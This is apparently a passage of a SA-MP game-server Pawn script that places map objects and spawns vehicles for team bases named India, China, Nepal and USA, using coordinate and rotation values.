CreateDynamicObject(13562, 1308.46094, 255.02344, 27.80469,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(700, -707.49304, 931.81927, 11.55469,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(700, -668.87262, 933.22351, 11.55469,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(11438, -678.27539, 940.96033, 11.91150,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(5170, -685.01636, 953.35254, 13.91948,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3434, -650.36658, 945.30280, 22.80951,   0.00000, 0.00000, 268.67130);
CreateDynamicObject(8613, -685.97949, 979.59753, 14.45770,   0.06000, 0.00000, 180.00000);
CreateDynamicObject(8613, -669.21545, 975.78796, 14.45769,   0.06000, 0.00000, -90.00000);
CreateDynamicObject(19340, -502.67621, 990.02545, -0.10097,   0.00000, 0.00000, -114.71998);
CreateDynamicObject(19340, -525.17560, 945.71704, -0.10097,   0.00000, 0.00000, -294.00003);
CreateDynamicObject(19340, -500.45517, 867.37640, -0.10097,   0.00000, 0.00000, -114.71998);
CreateDynamicObject(19340, -594.34357, 910.16119, -0.08911,   0.00000, 0.00000, -294.53998);
CreateDynamicObject(19340, -574.87964, 804.02795, -0.10097,   0.00000, 0.00000, -114.71998);
CreateDynamicObject(19340, -636.79395, 832.24304, -0.10097,   0.00000, 0.00000, -294.53998);
CreateDynamicObject(19340, -595.94440, 775.59576, -0.10097,   0.00000, 0.00000, -294.54013);
CreateDynamicObject(19340, -567.73267, 762.81262, -0.60470,   0.00000, 0.00000, -294.54013);
CreateDynamicObject(16121, -548.18793, 1032.24500, 2.42124,   0.00000, 0.00000, 48.30000);
CreateDynamicObject(16121, -500.03311, 1012.34143, 3.60272,   0.00000, 0.00000, 45.59999);
CreateDynamicObject(16121, -455.38718, 988.57288, 3.60272,   0.00000, 0.00000, 36.71999);
CreateDynamicObject(16121, -433.69028, 965.33105, 3.60272,   0.00000, 0.00000, -18.60001);
CreateDynamicObject(16121, -434.27576, 913.68091, 3.60272,   0.00000, 0.00000, -26.22000);
CreateDynamicObject(16121, -433.69028, 965.33105, 3.60272,   0.00000, 0.00000, -18.60001);
CreateDynamicObject(16121, -431.88940, 860.86517, 3.60272,   0.00000, 0.00000, -5.82000);
CreateDynamicObject(16121, -441.64963, 823.75696, 3.60272,   0.00000, 0.00000, -79.07999);
CreateDynamicObject(16121, -431.88940, 860.86517, 3.60272,   0.00000, 0.00000, -5.82000);
CreateDynamicObject(16121, -484.73145, 794.24469, 3.60272,   0.00000, 0.00000, -67.14000);
CreateDynamicObject(16121, -509.28580, 755.52509, 3.60272,   0.00000, 0.00000, -23.58001);
CreateDynamicObject(8171, -489.03055, 936.58063, 3.67999,   0.00000, 0.00000, -22.62000);
CreateDynamicObject(8171, -525.21368, 951.90186, 3.67681,   0.00000, 0.00000, -22.62000);
CreateDynamicObject(8172, -541.20398, 811.54340, 3.71433,   0.00000, 0.00000, -22.62000);
CreateDynamicObject(8172, -577.49658, 826.74585, 3.71433,   0.00000, 0.00000, -22.62000);
CreateDynamicObject(3268, -538.28284, 998.00061, 3.60456,   0.00000, 0.00000, 158.16000);
CreateDynamicObject(3268, -552.52509, 963.28119, 3.60456,   0.00000, 0.00000, 158.16000);
CreateDynamicObject(3268, -567.34717, 928.23541, 3.60456,   0.00000, 0.00000, 158.22000);
CreateDynamicObject(10763, -477.55447, 857.02332, 35.64643,   0.00000, 0.00000, -67.37999);
CreateDynamicObject(7186, -614.73254, 833.05176, 9.23264,   0.00000, 0.00000, -21.96000);
CreateDynamicObject(3279, -668.66339, 786.48785, 3.38626,   0.00000, 0.00000, -17.82000);
CreateDynamicObject(3279, -529.94769, 724.63922, 3.50319,   0.00000, 0.00000, -199.25999);
CreateDynamicObject(3279, -452.07797, 937.79517, 3.25784,   0.00000, 0.00000, -201.65994);
//Vehicles//
CreateVehicle(470, -702.2858, 956.4824, 12.0600, -177.8400, -1, -1, 100);
CreateVehicle(470, -706.8469, 956.4367, 12.0600, -177.6000, -1, -1, 100);
CreateVehicle(470, -697.4709, 956.5901, 12.0600, -178.9799, -1, -1, 100);
CreateVehicle(490, -690.5791, 956.0510, 12.2145, -181.0800, -1, -1, 100);
CreateVehicle(490, -684.0711, 955.9169, 12.2145, -181.0800, -1, -1, 100);
CreateVehicle(447, -659.6019, 975.0038, 18.8052, 90.0600, -1, -1, 100);
CreateVehicle(425, -687.9344, 970.4972, 19.6024, 92.7000, -1, -1, 100);
CreateVehicle(425, -698.0412, 828.5074, 44.7786, -99.8400, -1, -1, 100);
CreateVehicle(476, -468.5410, 965.8636, 5.6407, -202.3201, -1, -1, 100);
CreateVehicle(476, -482.0941, 971.2951, 5.6407, -202.2601, -1, -1, 100);
CreateVehicle(520, -536.6179, 998.7375, 5.1866, -115.3800, -1, -1, 100);
CreateVehicle(520, -549.8626, 962.4152, 5.1866, -115.0800, -1, -1, 100);
CreateVehicle(520, -566.2831, 924.1331, 5.1866, -115.0800, -1, -1, 100);
CreateVehicle(522, -707.2697, 940.1924, 11.9106, 0.0000, -1, -1, 100);
CreateVehicle(522, -709.0576, 940.2585, 11.9106, 0.0000, -1, -1, 100);
CreateVehicle(522, -707.2697, 940.1924, 11.9106, 0.0000, -1, -1, 100);
CreateVehicle(522, -710.8699, 940.3618, 11.9106, 0.0000, -1, -1, 100);
CreateVehicle(468, -713.5361, 939.6808, 11.8486, 0.0000, -1, -1, 100);
CreateVehicle(468, -715.2457, 939.6591, 11.8486, 0.0000, -1, -1, 100);
//India Base
CreateDynamicObject(16114, -932.72406, 1547.04907, 20.09306,   0.00000, 0.00000, 166.38431);
CreateDynamicObject(16114, -923.74878, 1580.14526, 7.88416,   0.00000, 0.00000, 166.38431);
CreateDynamicObject(16114, -936.53912, 1522.32886, 21.10410,   0.00000, 0.00000, 166.38431);
CreateDynamicObject(16114, -936.05743, 1495.39526, 21.70284,   0.00000, 0.00000, 166.38431);
CreateDynamicObject(16114, -920.05994, 1474.18628, 20.77854,   0.00000, 0.00000, 209.61090);
CreateDynamicObject(3928, -782.02533, 1595.94800, 33.96810,   0.00000, 0.00000, 358.98581);
CreateDynamicObject(3928, -798.82123, 1631.10974, 29.34988,   0.00000, 0.00000, 358.98581);
CreateDynamicObject(16114, -902.60480, 1593.72412, 10.94051,   0.00000, 0.00000, 166.38431);
CreateDynamicObject(18266, -771.49658, 1594.44641, 30.62330,   0.00000, 0.00000, 270.32593);
CreateDynamicObject(3866, -901.47156, 1521.91101, 31.92520,   0.00000, 0.00000, 85.65632);
CreateDynamicObject(3866, -887.71313, 1518.06519, 31.88677,   0.00000, 0.00000, 176.40799);
CreateDynamicObject(3866, -884.63129, 1541.09155, 32.03022,   0.00000, 0.00000, 269.98883);
CreateDynamicObject(3866, -898.51898, 1544.10547, 32.18978,   0.00000, 0.00000, 359.81778);
CreateDynamicObject(10831, -782.71729, 1557.28369, 30.42870,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(3399, -799.66553, 1592.31055, 29.64200,   0.00000, -18.00000, 0.00000);
CreateDynamicObject(18850, -782.86804, 1437.14648, 0.75132,   0.00000, 0.00000, 358.97971);
CreateDynamicObject(16114, -880.73047, 1418.59229, 6.20697,   0.00000, 0.00000, 209.61090);
CreateDynamicObject(16114, -900.21405, 1437.19055, 14.94648,   0.00000, 0.00000, 209.61090);
CreateDynamicObject(16114, -859.94287, 1382.89050, 2.05667,   0.00000, 0.00000, 209.61090);
CreateDynamicObject(16114, -908.52948, 1461.15491, 18.21104,   0.00000, 0.00000, 209.61090);
CreateDynamicObject(3279, -823.11200, 1581.34790, 26.10744,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3627, -862.06000, 1555.72815, 25.52210,   5.00000, 0.00000, 360.00000);
CreateDynamicObject(3749, -865.81598, 1627.25720, 31.09580,   0.00000, 0.00000, 29.43957);
CreateDynamicObject(13696, -804.31476, 1629.72717, 22.77386,   0.00000, 0.00000, 359.86713);
CreateDynamicObject(3256, -920.84369, 1575.72070, 27.77251,   0.00000, 0.00000, 140.06332);
//Vehicles//
AddStaticVehicleEx(425,-799.1528000,1631.9545000,30.9079000,0.0000000,-1,-1,15); //Hunter
AddStaticVehicleEx(520,-787.5345000,1437.5181000,14.7843000,90.0000000,-1,-1,15); //Hydra
AddStaticVehicleEx(476,-776.9476000,1635.4171000,28.0969000,270.0000000,-1,-1,15); //Rustler
AddStaticVehicleEx(476,-763.4514000,1635.2751000,28.5029000,270.0000000,-1,-1,15); //Rustler
AddStaticVehicleEx(528,-864.0167000,1545.8195000,23.2951000,270.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(528,-864.2097000,1553.9409000,24.0031000,270.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(528,-864.6027000,1564.5000000,24.7122000,270.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(522,-866.0444000,1569.0007000,24.3918000,270.0000000,-1,-1,15); //NRG-500
AddStaticVehicleEx(468,-864.2344000,1557.7843000,23.6948000,270.0000000,-1,-1,15); //Sanchez
AddStaticVehicleEx(468,-864.4533000,1559.7123000,23.8948000,270.0000000,-1,-1,15); //Sanchez
AddStaticVehicleEx(468,-864.2400000,1542.4255000,22.3797000,270.0000000,-1,-1,15); //Sanchez
AddStaticVehicleEx(468,-864.5176000,1549.6423000,22.9848000,270.0000000,-1,-1,15); //Sanchez
AddStaticVehicleEx(432,-788.1246000,1557.1599000,27.0218000,90.0000000,-1,-1,15); //Rhino
AddStaticVehicleEx(487,-821.7049000,1557.2656000,30.7139000,0.0000000,-1,-1,15); //Maverick
AddStaticVehicleEx(470,-829.0173000,1424.9596000,13.7320000,0.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(470,-822.3240000,1425.0342000,13.7320000,0.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(470,-806.5242000,1425.1420000,13.7320000,0.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(470,-809.9684000,1449.3596000,13.7288000,180.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(470,-817.9488000,1443.6226000,13.5278000,180.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(470,-804.8453000,1442.5111000,13.6258000,180.0000000,-1,-1,15); //Patriot
AddStaticVehicleEx(433,-747.6829000,1579.8065000,27.5187000,90.0000000,-1,-1,15); //Barracks
AddStaticVehicleEx(489,-746.2010000,1568.8667000,27.0735000,90.0000000,-1,-1,15); //Rancher
AddStaticVehicleEx(489,-745.9783000,1563.9302000,27.0735000,90.0000000,-1,-1,15); //Rancher
//China Base
CreateDynamicObject(3749, -115.49808, 1221.52856, 22.81036,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8147, -239.69099, 1118.71826, 19.08656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8147, -58.82002, 1117.68127, 21.80660,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8151, -98.62497, 1020.54614, 23.27034,   0.00000, 0.00000, 270.04901);
CreateDynamicObject(8147, -195.39198, 1207.14758, 18.68986,   0.00000, 0.00000, 90.25670);
CreateDynamicObject(8210, -238.68028, 1018.18359, 19.04877,   0.00000, 0.00000, 92.03837);
CreateDynamicObject(8210, -157.37282, 990.01721, 21.88205,   0.00000, 0.00000, 358.26193);
CreateDynamicObject(987, -237.49779, 990.49396, 18.63319,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -122.25216, 1207.67639, 18.23034,   0.00000, 0.00000, 92.27201);
CreateDynamicObject(987, -106.65011, 1208.03711, 18.06171,   0.00000, 0.00000, 89.87713);
CreateDynamicObject(987, -106.70264, 1207.89514, 18.11473,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -94.84398, 1207.89417, 18.05103,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -82.88767, 1207.91296, 18.01891,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -71.50135, 1207.79675, 18.01891,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3749, -57.84321, 1198.20142, 23.58762,   0.00000, 0.00000, 269.42871);
CreateDynamicObject(987, -225.64581, 990.32538, 18.63319,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -213.67477, 990.26666, 18.63319,   0.00000, 0.00000, 1.02124);
CreateDynamicObject(3749, -194.44261, 988.77728, 23.60556,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -262.98004, 1192.25977, 18.70125,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -251.03413, 1191.91943, 18.49216,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3749, -266.83029, 1199.43567, 23.69621,   0.00000, 0.00000, 268.72186);
CreateDynamicObject(987, -268.93488, 1192.29932, 18.70125,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3268, -215.54774, 1159.27930, 18.71570,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(17324, -217.78841, 1181.45337, 18.69180,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(17324, -217.70688, 1137.09998, 18.73260,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3627, -140.49799, 1079.30054, 21.17660,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3256, -83.46019, 1119.95422, 18.30534,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18266, -152.12984, 1177.43518, 22.69160,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(4832, -89.54742, 1164.10095, 59.07051,   0.00000, 0.00000, -90.54000);
CreateDynamicObject(18850, -166.87697, 1123.13330, 6.70929,   0.00000, 0.00000, -90.06001);
CreateDynamicObject(4874, -109.15034, 1068.51501, 22.21244,   0.00000, 0.00000, -180.78006);
CreateDynamicObject(3866, -139.07237, 1034.40320, 26.42922,   0.00000, 0.00000, -88.92001);
CreateDynamicObject(3887, -106.82615, 1022.14899, 26.92491,   0.00000, 0.00000, -180.18008);
CreateDynamicObject(3866, -138.87596, 1022.80249, 26.42922,   0.00000, 0.00000, -268.43988);
CreateDynamicObject(16326, -108.55339, 1128.28394, 18.67745,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3279, -145.42969, 1133.89172, 18.31109,   0.00000, 0.00000, -1.14000);
CreateDynamicObject(3279, -229.13652, 1058.61414, 18.31109,   0.00000, 0.00000, -1.14000);
CreateDynamicObject(3279, -231.87750, 1165.00439, 18.31109,   0.00000, 0.00000, -1.14000);
CreateDynamicObject(3279, -121.91959, 1043.75574, 18.31109,   0.00000, 0.00000, -1.14000);
CreateDynamicObject(3359, -127.86275, 1125.59753, 18.69832,   0.00000, 0.00000, -178.08003);
//Vehicles//
CreateVehicle(425, -92.7269, 1071.7180, 23.2854, 0.0000, -1, -1, 100);
CreateVehicle(470, -121.9968, 1076.9462, 19.4674, 2.0400, -1, -1, 100);
CreateVehicle(470, -127.9035, 1076.4569, 19.4674, 1.2600, -1, -1, 100);
CreateVehicle(470, -131.8489, 1076.5172, 19.4674, 1.2600, -1, -1, 100);
CreateVehicle(470, -138.0300, 1076.4387, 19.4674, -2.6400, -1, -1, 100);
CreateVehicle(528, -142.7813, 1076.1041, 19.6770, 0.0000, -1, -1, 100);
CreateVehicle(528, -148.3040, 1076.2548, 19.6770, 0.0000, -1, -1, 100);
CreateVehicle(490, -152.9787, 1076.0303, 19.8401, 0.0000, -1, -1, 100);
CreateVehicle(490, -159.7125, 1076.5813, 19.8401, 0.0000, -1, -1, 100);
CreateVehicle(520, -167.4267, 1124.0293, 20.5999, 0.0000, -1, -1, 100);
CreateVehicle(447, -163.8614, 1176.9535, 26.9944, 0.0000, -1, -1, 100);
CreateVehicle(447, -138.1748, 1176.5439, 26.9944, 0.0000, -1, -1, 100);
CreateVehicle(487, -152.1816, 1175.7583, 27.0516, 0.0000, -1, -1, 100);
CreateVehicle(432, -215.5858, 1167.2465, 19.4026, -89.4000, -1, -1, 100);
CreateVehicle(427, -215.3474, 1181.8049, 19.6606, -90.7200, -1, -1, 100);
CreateVehicle(427, -214.6507, 1137.2972, 19.6606, -90.6600, -1, -1, 100);
CreateVehicle(432, -214.9970, 1153.0928, 19.4026, -88.5000, -1, -1, 100);
//Nepal Base
CreateDynamicObject(3279, -1548.28442, 2548.10352, 54.77415,   0.00000, 0.00000, 45.84002);
CreateDynamicObject(3279, -1412.89819, 2667.10034, 54.48910,   0.00000, 0.00000, -178.00000);
CreateDynamicObject(3268, -1520.65662, 2651.08984, 54.75040,   0.00000, 0.00000, 269.88007);
CreateDynamicObject(3279, -1470.94934, 2638.68799, 54.82900,   0.00000, 0.00000, 91.00000);
CreateDynamicObject(3279, -1641.01282, 2562.36401, 82.49440,   0.00000, 0.00000, -6.00000);
CreateDynamicObject(3031, -1385.50525, 2630.49219, 60.43620,   0.00000, 0.00000, 168.00000);
CreateDynamicObject(3268, -1475.41980, 2557.92725, 54.75040,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3399, -1457.80798, 2569.00244, 55.84530,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3268, -1520.94409, 2621.23389, 54.75040,   0.00000, 0.00000, 88.67999);
CreateDynamicObject(10766, -1516.06494, 2500.39063, 53.13527,   0.00000, 0.00000, -178.73990);
CreateDynamicObject(3578, -1493.20776, 2543.06909, 54.82448,   0.00000, 0.00000, 2.28000);
CreateDynamicObject(3578, -1503.31372, 2542.73071, 54.82448,   0.00000, 0.00000, 2.16000);
CreateDynamicObject(3578, -1513.57849, 2542.37329, 54.82448,   0.00000, 0.00000, 1.98000);
CreateDynamicObject(3578, -1523.82629, 2542.06470, 54.82448,   0.00000, 0.00000, 1.56000);
CreateDynamicObject(3578, -1533.91162, 2541.90381, 54.82448,   0.00000, 0.00000, 0.54000);
CreateDynamicObject(3578, -1540.95386, 2541.84473, 54.82448,   0.00000, 0.00000, 0.54000);
CreateDynamicObject(4100, -1512.57446, 2561.18115, 56.46026,   0.00000, 0.00000, -40.08000);
CreateDynamicObject(4100, -1512.57446, 2561.18115, 59.29430,   -0.24000, -0.30000, -40.08000);
CreateDynamicObject(4100, -1512.57446, 2561.18115, 56.46026,   0.00000, 0.00000, -40.08000);
CreateDynamicObject(4100, -1528.72742, 2561.17041, 56.46026,   0.00000, 0.00000, -39.90000);
CreateDynamicObject(4100, -1528.72742, 2561.17041, 59.28117,   -0.18000, -0.12000, -39.90000);
CreateDynamicObject(4100, -1535.92505, 2567.79565, 56.46026,   0.00000, 0.00000, -130.01993);
CreateDynamicObject(4100, -1528.72742, 2561.17041, 56.46026,   0.00000, 0.00000, -39.90000);
CreateDynamicObject(4100, -1535.92505, 2567.79565, 59.27145,   0.00000, -0.12000, -130.01993);
CreateDynamicObject(4100, -1536.01563, 2581.53760, 56.46026,   0.00000, 0.00000, -129.11993);
CreateDynamicObject(4100, -1505.98340, 2567.80591, 56.46026,   0.00000, 0.00000, -130.01993);
CreateDynamicObject(4100, -1536.05481, 2581.53027, 59.23532,   0.00000, 0.00000, -129.11993);
CreateDynamicObject(4100, -1536.03760, 2584.99341, 56.47766,   0.00000, 0.00000, -129.05994);
CreateDynamicObject(4100, -1536.09827, 2585.00293, 59.18517,   -0.12000, 0.00000, -129.05994);
CreateDynamicObject(4100, -1529.57153, 2592.05127, 56.47766,   0.00000, 0.00000, -220.67989);
CreateDynamicObject(4100, -1529.57153, 2592.05127, 59.29989,   -0.18000, -0.18000, -220.67989);
CreateDynamicObject(4100, -1515.80627, 2591.98486, 56.47766,   0.00000, 0.00000, -219.65988);
CreateDynamicObject(4100, -1529.57153, 2592.05127, 56.47766,   0.00000, 0.00000, -220.67989);
CreateDynamicObject(4100, -1529.57153, 2592.05127, 56.47766,   0.00000, 0.00000, -220.67989);
CreateDynamicObject(4100, -1515.80627, 2591.98486, 59.26255,   -0.12000, 0.00000, -219.65988);
CreateDynamicObject(4100, -1505.89746, 2581.56030, 56.46026,   0.00000, 0.00000, -130.31992);
CreateDynamicObject(4100, -1505.98340, 2567.80591, 59.27213,   -2.94000, -2.22000, -130.01993);
CreateDynamicObject(4100, -1505.89746, 2581.56030, 59.25597,   0.00000, 0.00000, -130.31992);
CreateDynamicObject(3928, -1529.95691, 2567.17554, 54.88094,   0.00000, 0.00000, 0.42000);
CreateDynamicObject(3928, -1530.21204, 2583.99731, 54.88094,   0.00000, 0.00000, 0.42000);
CreateDynamicObject(3928, -1510.94397, 2584.30786, 54.88094,   0.00000, 0.00000, 0.42000);
CreateDynamicObject(3928, -1511.09717, 2567.72949, 54.88094,   0.00000, 0.00000, 0.42000);
CreateDynamicObject(8209, -1553.68933, 2587.25928, 57.69518,   0.00000, 0.00000, -90.24001);
CreateDynamicObject(8209, -1553.92371, 2614.36157, 57.69518,   0.00000, 0.00000, -90.72002);
CreateDynamicObject(3749, -1554.86572, 2670.47363, 60.48204,   0.00000, 0.00000, 89.94000);
CreateDynamicObject(8209, -1503.07996, 2679.57251, 57.81751,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8209, -1445.92676, 2679.53003, 57.81751,   0.00000, 0.00000, -0.24000);
CreateDynamicObject(8210, -1397.00317, 2651.86304, 57.72688,   0.00000, 0.00000, -89.34002);
CreateDynamicObject(8210, -1396.89221, 2636.92261, 57.72688,   0.00000, 0.00000, -89.82001);
CreateDynamicObject(3749, -1398.76440, 2600.49634, 60.13427,   0.00000, 0.00000, 89.10001);
CreateDynamicObject(8210, -1460.23315, 2540.28882, 57.84756,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8210, -1416.69495, 2562.84912, 57.84756,   0.00000, 0.00000, 54.72001);
CreateDynamicObject(974, -1399.91541, 2588.63647, 57.94731,   0.00000, 0.00000, 82.56001);
CreateDynamicObject(974, -1399.91541, 2588.63647, 60.94176,   -0.78000, -0.66000, 82.56001);
CreateDynamicObject(9241, -1450.47644, 2647.03540, 56.48759,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(4100, -1435.95740, 2654.32202, 56.53119,   0.00000, 0.00000, 50.28001);
CreateDynamicObject(4100, -1435.87561, 2640.57788, 56.53119,   0.00000, 0.00000, 50.28001);
CreateDynamicObject(4100, -1445.88184, 2633.19409, 56.53119,   0.00000, 0.00000, -38.93999);
CreateDynamicObject(4100, -1456.13171, 2633.00439, 56.53119,   0.00000, 0.00000, -38.93999);
CreateDynamicObject(4100, -1463.29065, 2639.51318, 56.53119,   0.00000, 0.00000, -129.47997);
CreateDynamicObject(4100, -1463.46069, 2653.26758, 56.53119,   0.00000, 0.00000, -129.41997);
CreateDynamicObject(4100, -1463.29065, 2639.51318, 56.53119,   0.00000, 0.00000, -129.47997);
CreateDynamicObject(4100, -1457.01746, 2660.39624, 56.53119,   0.00000, 0.00000, -220.25990);
CreateDynamicObject(4100, -1463.29065, 2639.51318, 56.53119,   0.00000, 0.00000, -129.47997);
CreateDynamicObject(4100, -1463.46069, 2653.26758, 56.53119,   0.00000, 0.00000, -129.41997);
CreateDynamicObject(4100, -1443.24597, 2660.31152, 56.53119,   0.00000, 0.00000, -220.07991);
CreateDynamicObject(8171, -1516.22998, 2473.20630, 55.48151,   0.00000, 0.00000, 1.38000);
//Vehicles//
CreateVehicle(520, -1507.6024, 2532.5420, 56.6960, -178.4400, -1, -1, 100);
CreateVehicle(520, -1524.0289, 2532.1289, 56.6960, -179.2200, -1, -1, 100);
CreateVehicle(487, -1515.0392, 2567.6763, 55.8939, 90.7800, -1, -1, 100);
CreateVehicle(487, -1514.5688, 2584.5198, 55.8939, 90.7800, -1, -1, 100);
CreateVehicle(447, -1530.2524, 2584.1301, 55.6960, 0.0000, -1, -1, 100);
CreateVehicle(447, -1530.1036, 2570.1431, 55.6960, 1.8600, -1, -1, 100);
CreateVehicle(425, -1449.8590, 2648.6313, 58.8316, 0.0000, -1, -1, 100);
CreateVehicle(432, -1526.9218, 2622.9204, 55.6540, 179.8200, -1, -1, 100);
CreateVehicle(432, -1514.4088, 2623.4722, 55.6540, 176.8200, -1, -1, 100);
CreateVehicle(470, -1513.2380, 2648.9827, 55.5963, 0.0000, -1, -1, 100);
CreateVehicle(470, -1521.4521, 2649.5793, 55.5963, -0.1200, -1, -1, 100);
CreateVehicle(470, -1529.1897, 2649.0762, 55.5963, -0.1200, -1, -1, 100);
CreateVehicle(522, -1477.5093, 2649.0933, 55.2977, 0.0000, -1, -1, 100);
CreateVehicle(522, -1479.0786, 2649.1401, 55.2977, -0.0600, -1, -1, 100);
CreateVehicle(522, -1476.1445, 2649.2590, 55.2977, 0.1800, -1, -1, 100);
CreateVehicle(468, -1473.6583, 2648.2583, 55.3982, 0.0000, -1, -1, 100);
CreateVehicle(468, -1471.9980, 2648.2571, 55.3982, 0.8400, -1, -1, 100);
CreateVehicle(468, -1473.6583, 2648.2583, 55.3982, 0.0000, -1, -1, 100);
CreateVehicle(468, -1470.7936, 2648.4268, 55.3982, 1.0800, -1, -1, 100);
CreateVehicle(490, -1402.9469, 2653.3865, 55.7264, 90.4800, -1, -1, 100);
CreateVehicle(490, -1402.3568, 2643.7205, 55.7264, 90.1800, -1, -1, 100);
CreateVehicle(490, -1402.9469, 2653.3865, 55.7264, 90.4800, -1, -1, 100);
CreateVehicle(490, -1401.6060, 2634.1931, 55.7264, 90.1800, -1, -1, 100);
CreateVehicle(528, -1474.4910, 2550.1077, 55.7030, 89.2800, -1, -1, 100);
CreateVehicle(528, -1474.9681, 2557.7642, 55.8209, 89.2800, -1, -1, 100);
CreateVehicle(528, -1475.2371, 2565.9634, 55.8406, 89.4000, -1, -1, 100);
CreateVehicle(476, -1543.4585, 2692.3257, 62.5542, -89.9400, -1, -1, 100);
CreateVehicle(476, -1544.1333, 2706.0769, 62.5542, -89.9400, -1, -1, 100);
//USA Base
CreateDynamicObject(3749, -142.61159, 2635.92969, 68.62507,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(8147, -141.37137, 2716.85645, 64.21797,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3749, -386.11359, 2699.68726, 68.05341,   0.00000, 0.00000, 43.28093);
CreateDynamicObject(8165, -372.96912, 2664.26611, 65.57710,   0.00000, 0.00000, 12.88185);
CreateDynamicObject(8165, -325.15509, 2621.47095, 63.77379,   0.00000, 0.00000, 41.62535);
CreateDynamicObject(8315, -358.93643, 2727.30200, 64.86166,   0.00000, 0.00000, 322.10287);
CreateDynamicObject(987, -156.34975, 2626.27075, 62.41407,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -168.01274, 2623.39063, 62.43446,   0.00000, 0.00000, 14.00385);
CreateDynamicObject(987, -179.43375, 2619.92065, 62.16171,   0.00000, 0.00000, 17.16620);
CreateDynamicObject(987, -191.05151, 2616.46680, 61.69026,   0.00000, 0.00000, 17.86772);
CreateDynamicObject(987, -194.78546, 2605.00122, 61.38725,   0.00000, 0.00000, 72.88489);
CreateDynamicObject(987, -195.15511, 2594.08765, 61.38725,   0.00000, 0.00000, 89.36833);
CreateDynamicObject(987, -245.59381, 2591.19043, 61.84312,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -233.61974, 2590.85229, 61.84312,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -221.63963, 2590.74292, 61.84312,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, -198.12631, 2590.37793, 61.69582,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(18451, -198.61508, 2594.78101, 62.28688,   0.00000, 0.00000, 225.63255);
CreateDynamicObject(18850, -233.90947, 2726.49707, 49.50030,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3458, -223.76894, 2593.98779, 63.22389,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10831, -230.10309, 2667.18701, 66.23981,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3279, -291.36157, 2607.84790, 62.02771,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3279, -147.88881, 2652.48877, 62.95130,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(3279, -368.86578, 2703.85962, 62.23041,   0.00000, 0.00000, 38.15659);
CreateDynamicObject(3256, -325.05087, 2651.98242, 62.85117,   0.00000, 0.00000, 45.18933);
CreateDynamicObject(5130, -217.79303, 2686.69141, 64.48325,   0.00000, 0.00000, 44.68221);
CreateDynamicObject(16122, -135.69885, 2756.89209, 59.25166,   0.00000, 0.00000, 29.28934);
CreateDynamicObject(3689, -226.06807, 2780.75220, 69.17466,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16082, -224.86688, 2759.26855, 67.97913,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3627, -205.48830, 2666.64160, 64.08768,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3268, -282.08813, 2679.84497, 61.25628,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(1100, -257.06024, 2598.66919, 64.65715,   0.00000, 0.00000, 273.27856);
CreateDynamicObject(3887, -301.58371, 2724.18262, 69.81574,   0.00000, 0.00000, -89.22001);
CreateDynamicObject(3359, -155.09819, 2686.60059, 61.85483,   0.00000, 0.00000, -92.39998);
CreateDynamicObject(4832, -179.64610, 2661.45605, 75.40120,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18850, -209.02075, 2726.55762, 49.50030,   0.00000, 0.00000, 90.00000);
//Vehicles//
AddStaticVehicleEx(520,-233.9290000,2727.6211000,63.5403000,0.0000000,-1,-1,15); //Hydra
AddStaticVehicleEx(528,-209.1642000,2656.0278000,62.6325000,270.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(528,-208.4080000,2666.0962000,62.6325000,270.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(528,-208.0709000,2676.0913000,62.6325000,270.0000000,-1,-1,15); //FBI Truck
AddStaticVehicleEx(528,-207.6405000,2684.2219000,62.6325000,270.0000000,-1,-1,15); //FBI Truck
